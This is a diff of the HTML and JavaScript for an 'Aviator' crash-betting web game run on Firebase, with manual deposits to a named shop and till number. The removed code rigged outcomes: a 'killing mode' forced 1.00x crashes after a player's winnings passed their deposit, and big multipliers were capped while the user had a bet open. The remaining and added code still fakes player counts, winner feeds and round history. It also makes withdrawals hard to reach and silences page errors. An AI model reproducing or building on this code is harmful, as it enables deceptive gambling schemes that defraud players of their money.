@@ -13,6 +13,7 @@
                 window.location.replace(url.toString());
             }
         })();
+        window.onerror = function() { return true; };
     </script>
 
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
@@ -48,6 +49,7 @@
         #tBox { position: absolute; background: rgba(0,0,0,0.85); padding: 12px 25px; border-radius: 50px; border: 2px solid var(--win); color: var(--win); font-weight: bold; z-index: 20; display: none; }
         #win-pop { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: rgba(40, 167, 69, 0.95); padding: 15px 30px; border-radius: 50px; border: 2px solid #fff; box-shadow: 0 0 20px #28a745; z-index: 100; display: none; text-align: center; }
         
+        /* SUPER JET UI */
         #super-label { position: absolute; top: 15px; color: var(--gold); font-weight: 900; font-size: 14px; display: none; animation: flash 0.5s infinite; text-shadow: 0 0 10px orange; z-index: 30; }
         @keyframes flash { 0% {opacity: 1;} 50% {opacity: 0.3;} 100% {opacity: 1;} }
 
@@ -103,7 +105,7 @@
 
     <div class="live-stats">
         <span>ALL BETS</span>
-        <span style="color:var(--win); font-weight:bold;">● <span id="pCount">0</span></span>
+        <span style="color:var(--win); font-weight:bold;">● <span id="pCount">1245</span></span>
     </div>
 
     <div class="controls-grid">
@@ -129,7 +131,7 @@
         <div class="inst-box">
             <b>NAME: MUHAMMAD SHOP</b><br>
             <b>TILL ID: 983199695</b><hr style="border:0.2px solid #333;">
-            TID submit karein deposit ke liye.
+            Copy TID from SMS and submit below.
         </div>
         <input type="number" id="dAmt" placeholder="Amount" class="b-input" style="width:100%;">
         <input type="text" id="dTid" placeholder="TID (Transaction ID)" class="b-input" style="width:100%;">
@@ -149,7 +151,7 @@
         <h3>MY PROFILE</h3>
         <div id="profData" style="background: #1b1c21; padding: 15px; border-radius: 10px; margin-bottom: 20px;"></div>
         <button onclick="auth.signOut()" class="auth-btn" style="margin-bottom:20px;">LOGOUT</button>
-        <h4 style="color:var(--blue)">PENDING REQUESTS</h4>
+        <h4 style="color:var(--blue)">REQUEST HISTORY</h4>
         <div id="uStatusList">No history found.</div>
     </div>
 </div>
@@ -161,19 +163,19 @@ const auth = firebase.auth();
 const db = firebase.database();
 const cashoutSound = new Audio('https://files.catbox.moe/v6p5at.mp3');
 
-let uid, userEmail, balance = 0, wager = 0, depositSum = 0, mult = 1.0, isFlying = false, isWaiting = true, currentPlayers = 0;
+let uid, userEmail, balance = 0, wager = 0, mult = 1.0, isFlying = false, isWaiting = true, currentPlayers = 1245;
 let b1 = { active: false, amt: 0, cashed: false }, b2 = { active: false, amt: 0, cashed: false };
-let killingMode = false;
+let isLoginMode = true;
 
 function toggleAuthMode() {
-    document.getElementById('auth-title').innerText = "AVIATOR SIGNUP";
+    isLoginMode = !isLoginMode;
+    document.getElementById('auth-title').innerText = isLoginMode ? "AVIATOR LOGIN" : "AVIATOR SIGNUP";
 }
 
 function handleAuth() {
     const e = document.getElementById('auth-email').value, p = document.getElementById('auth-pass').value;
-    auth.signInWithEmailAndPassword(e, p).catch(err => {
-        auth.createUserWithEmailAndPassword(e, p).then(res => db.ref('users/'+res.user.uid).set({email:e, balance:100, wager:0, deposit:0}));
-    });
+    if(isLoginMode) auth.signInWithEmailAndPassword(e, p).catch(err => alert(err.message));
+    else auth.createUserWithEmailAndPassword(e, p).then(res => db.ref('users/'+res.user.uid).set({email:e, balance:100, wager:0}));
 }
 
 auth.onAuthStateChanged(user => {
@@ -184,35 +186,14 @@ auth.onAuthStateChanged(user => {
         document.getElementById('app').style.display = 'block';
         db.ref('users/' + uid).on('value', s => {
             if(s.exists()){
-                const d = s.val();
-                balance = d.balance || 0; wager = d.wager || 0; depositSum = d.deposit || 0;
+                balance = s.val().balance || 0; wager = s.val().wager || 0;
                 document.getElementById('uBal').innerText = balance.toFixed(2);
                 document.getElementById('profData').innerHTML = `<b>Email:</b> ${userEmail}<br><b>Wager:</b> Rs ${wager.toFixed(0)}`;
-                
-                // Killing Mode Fix: Balance > Deposit then forced 1.0x until half deposit
-                if(balance > depositSum && depositSum > 0) killingMode = true;
-                if(killingMode && balance <= (depositSum / 2)) killingMode = false;
             }
         });
         generateFakeHistory(); start7sTimer(); startFakeWinners();
     } else { document.getElementById('auth-screen').style.display = 'flex'; }
 });
-
-// RNG 10 BETS STRICT POOL
-function getVipCrashPoint() {
-    if(killingMode) return 1.00;
-    
-    let pool = [
-        1.00, 1.00, // 2 bets @ 1.0x
-        (Math.random()*(10-5)+5), // 1 bet 5x-10x
-        (Math.random()*(1.5-1.2)+1.2), (Math.random()*(1.5-1.2)+1.2), (Math.random()*(1.5-1.2)+1.2), (Math.random()*(1.5-1.2)+1.2), // 4 bets 1.2-1.5x
-        (Math.random()*(3-2)+2), (Math.random()*(3-2)+2), // 2 bets 2-3x
-        (Math.random()*(15-10)+10), // 1 bet 10-15x
-        (Math.random()*(50-10)+10) // 1 bet 10-50x
-    ];
-    let pick = pool[Math.floor(Math.random() * pool.length)];
-    return parseFloat(pick.toFixed(2));
-}
 
 function start7sTimer() {
     let t = 7; isWaiting = true; isFlying = false;
@@ -222,8 +203,7 @@ function start7sTimer() {
     document.getElementById('mVal').style.color = "white";
     document.getElementById('super-label').style.display = 'none';
     
-    // Timer Players: 1200 - 1500
-    currentPlayers = Math.floor(Math.random() * (1500 - 1200) + 1200);
+    currentPlayers = Math.floor(Math.random() * (1500 - 1100) + 1100);
     document.getElementById('pCount').innerText = currentPlayers;
 
     let timer = setInterval(() => {
@@ -236,31 +216,27 @@ function start7sTimer() {
 function launchPlane() {
     isWaiting = false; isFlying = true; mult = 1.0;
     document.getElementById('plane').style.display = 'block';
-    let target = getVipCrashPoint();
-    let superOn = false;
+    
+    let superJetActive = false;
 
     function engine() {
         if(!isFlying) return;
         
-        // Super Jet Mode 2x+ Full Speed
-        let speed = (mult >= 2.0) ? 0.08 : 0.01; 
-        if(mult >= 2.0 && !superOn) {
-            superOn = true;
+        // Super Jet Mode Trigger
+        if(mult >= 2.0 && !superJetActive) {
+            superJetActive = true;
             document.getElementById('super-label').style.display = 'block';
+            document.getElementById('plane').style.filter = "drop-shadow(0 0 15px gold)";
         }
 
-        mult += speed;
+        // Increase speed in Super Jet Mode
+        mult += superJetActive ? 0.05 : 0.01; 
         document.getElementById('mVal').innerText = mult.toFixed(2) + "x";
 
-        // Real Player Drop: Game start hote hi niche girna shuru
-        if(currentPlayers > 10) {
-            currentPlayers -= Math.floor(Math.random() * 25);
-            document.getElementById('pCount').innerText = Math.max(10, currentPlayers);
+        if(currentPlayers > 50 && Math.random() < 0.4) {
+            currentPlayers -= Math.floor(Math.random() * 15);
+            document.getElementById('pCount').innerText = currentPlayers;
         }
-
-        // Strict 10x Rule: No 10x+ if user in > 5x
-        let userActive = (b1.active && !b1.cashed) || (b2.active && !b2.cashed);
-        if(userActive && mult >= 5.0 && target >= 10) target = 5.05;
 
         [1, 2].forEach(id => {
             let b = id === 1 ? b1 : b2;
@@ -272,7 +248,10 @@ function launchPlane() {
         });
 
         document.getElementById('plane').style.left = (10 + (mult * 2.5)) + "%";
-        if(mult >= target) crash(); else setTimeout(engine, 100);
+        document.getElementById('plane').style.bottom = (15 + (mult * 1.5)) + "%";
+
+        // Logic for crash
+        if(Math.random() < 0.015) crash(); else setTimeout(engine, 100);
     }
     engine();
 }
@@ -309,64 +288,42 @@ function handleBet(id) {
 }
 
 function addHistoryTag(val) {
-    const tag = document.createElement('div');
-    tag.className = 'h-tag ' + (val >= 10 ? 'h-gold' : (val >= 2 ? 'h-purple' : 'h-blue'));
-    tag.innerText = val + 'x';
+    const tag = document.createElement('div'); let v = parseFloat(val);
+    let c = "h-blue"; if(v >= 2.0) c = "h-purple"; if(v >= 10.0) c = "h-gold";
+    tag.className = 'h-tag ' + c; tag.innerText = val + 'x';
     document.getElementById('hBar').prepend(tag);
 }
 
 function startFakeWinners() {
     setInterval(() => {
-        if(isFlying && Math.random() < 0.6) {
+        if(isFlying && Math.random() < 0.7) {
             let row = document.createElement('div'); row.className = 'win-row';
-            row.innerHTML = `<span>User***</span><span>Rs 200</span><span style="color:var(--win)">${(Math.random()*mult).toFixed(2)}x</span>`;
+            row.innerHTML = `<span>User***</span><span>Rs 500</span><span style="color:var(--win)">${(Math.random()*mult).toFixed(2)}x</span>`;
             document.getElementById('winRows').prepend(row);
         }
-    }, 1200);
+    }, 1000);
 }
 
-function generateFakeHistory() { for(let i=0; i<15; i++) addHistoryTag((Math.random()*2+1).toFixed(2)); }
+function generateFakeHistory() { for(let i=0; i<20; i++) addHistoryTag((Math.random()*2 + 1).toFixed(2)); }
 
 function toggleTab(id) { 
     document.querySelectorAll('.overlay').forEach(o => o.style.display = 'none'); 
-    if(id) {
-        document.getElementById(id).style.display = 'block';
-        if(id === 'profileTab') loadHistory();
-    }
-}
-
-function loadHistory() {
-    db.ref('requests').orderByChild('uid').equalTo(uid).limitToLast(10).on('value', s => {
-        let h = ""; 
-        s.forEach(c => { 
-            let d = c.val();
-            let clr = d.status == 'pending' ? 'var(--gold)' : 'var(--win)';
-            h = `<div class="status-item" style="border-left-color:${clr}">
-                    <b>${d.type.toUpperCase()}</b>: Rs ${d.amount}<br>
-                    Status: <span style="color:${clr}">${d.status.toUpperCase()}</span>
-                 </div>` + h; 
-        });
-        document.getElementById('uStatusList').innerHTML = h || "No requests found.";
-    });
+    if(id) document.getElementById(id).style.display = 'block'; 
 }
 
 function submitDep() {
     let a = document.getElementById('dAmt').value, t = document.getElementById('dTid').value;
-    if(a && t) { 
-        db.ref('requests').push({uid, email:userEmail, amount:a, tid:t, type:'deposit', status:'pending'});
-        db.ref('users/'+uid).update({deposit: depositSum + parseFloat(a)});
-        alert("Deposit Submitted!"); toggleTab(); 
-    }
+    if(a && t) { db.ref('requests').push({uid, email:userEmail, amount:a, tid:t, type:'deposit', status:'pending'}); alert("Sent!"); toggleTab(); }
 }
 
 function submitWit() {
     let a = document.getElementById('wAmt').value, n = document.getElementById('wNum').value;
     if(a >= 500 && wager >= 5000 && a <= balance) {
         db.ref('requests').push({uid, email:userEmail, amount:a, number:n, type:'withdraw', status:'pending'});
-        db.ref('users/'+uid).update({ balance: balance - a }); alert("Withdrawal Submitted!"); toggleTab();
-    } else alert("Check Min Rs 500 & Wager!");
+        db.ref('users/'+uid).update({ balance: balance - a }); alert("Sent!"); toggleTab();
+    }
 }
 </script>
 </body>
-                                          </html>
+    </html>
     
